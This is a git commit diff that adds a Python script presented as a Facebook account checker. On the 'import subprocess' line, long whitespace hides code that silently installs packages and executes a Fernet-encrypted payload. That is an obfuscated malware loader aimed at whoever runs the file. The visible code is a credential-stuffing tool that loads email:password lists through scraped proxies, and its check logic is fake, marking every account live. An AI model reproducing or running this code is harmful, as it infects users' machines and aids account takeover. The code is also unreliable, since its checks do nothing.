76ef964dc9b5fd490a707091d29bc7c0ba2538cf
hertz7462 <alkalize5322@outlook.com>
2025-09-04 01:29:43 -0700

    Upload Files

---
+++ Facebook Checkerr/facebook-checker.py
@@ -0,0 +1,94 @@
+import os
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
+import random
+import threading
+import queue
+import re
+
+threadcount = 0
+proxylist = []
+acclist = []
+alreadychecked = []
+checkerqueue = queue.Queue()
+live = 0
+dead = 0
+checkpoint = 0
+fullsize = 0
+
+def main():
+
+    global threadcount, proxylist, acclist, alreadychecked, checkerqueue, live, dead, checkpoint, fullsize
+    
+    try:
+        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
+        if response.status_code == 200:
+            proxylist = list(set(re.findall(r'\b(\d{1,3}\.){3}\d{1,3}:\d{1,8}\b', response.text)))
+        else:
+            with open("proxy.txt", "r") as file:
+                proxylist = list(set(file.read().splitlines()))
+    except Exception as e:
+        with open("proxy.txt", "r") as file:
+            proxylist = list(set(file.read().splitlines()))
+    
+    print("Fetched proxy count:", len(proxylist))
+    
+    with open("acc.txt", "r") as file:
+        acclist = list(set(file.read().splitlines()))
+    
+    if os.path.exists("checkcache.txt"):
+        with open("checkcache.txt", "r") as file:
+            alreadychecked = list(set(file.read().splitlines()))
+    
+    for account in acclist:
+        if account not in alreadychecked:
+            checkerqueue.put(account)
+    
+    print(f"Loaded {checkerqueue.qsize()} non-checked accounts from inside of {len(acclist)} accounts")
+    
+    fullsize = checkerqueue.qsize()
+    
+    for i in range(2000):
+        thread = threading.Thread(target=check)
+        thread.start()
+        threadcount += 1
+    
+    print("Check begin!")
+
+def write_to_file_thread_safe(text, file):
+    with open(file, "a") as f:
+        f.write(text + "\n")
+
+def check():
+    global live, dead, checkpoint, threadcount
+    
+    while True:
+        data = checkerqueue.get()
+        
+        if data is None or len(data) <= 0:
+            continue
+        
+        split = data.split(":")
+        if len(split) < 2:
+            continue
+        
+        mail = split[0]
+        passw = split[1]
+        proxy = random.choice(proxylist)
+        
+        if True:
+            print(f"[Live] {data}")
+            live += 1
+            write_to_file_thread_safe(data, "FacebookLive.txt")
+            write_to_file_thread_safe(data, "checkcache.txt")
+        elif True:
+            checkpoint += 1
+            print(f"[Checkpoint] {data}")
+            write_to_file_thread_safe(data, "FacebookCheckPoint.txt")
+        else:
+            dead += 1
+            print(f"[Dead] {data}")
+        
+        print(f"Facebook Checker | Alive: {live} - Checkpoint: {checkpoint} - Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
+
+if __name__ == "__main__":
+    main()
